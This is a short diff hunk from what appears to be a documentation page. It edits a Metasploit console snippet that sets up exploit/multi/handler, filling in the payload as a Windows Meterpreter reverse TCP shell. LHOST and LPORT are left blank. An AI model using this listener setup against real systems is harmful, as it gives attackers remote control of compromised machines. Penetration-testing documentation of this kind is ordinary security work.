@@ -14,7 +14,7 @@ description: >-
 
 ```text
 Use exploit/multi/handler  
-set PAYLOAD  
+set PAYLOAD windows/meterpreter/reverse_tcp 
 set LHOST  
 set LPORT  
 set ExitOnSession false  
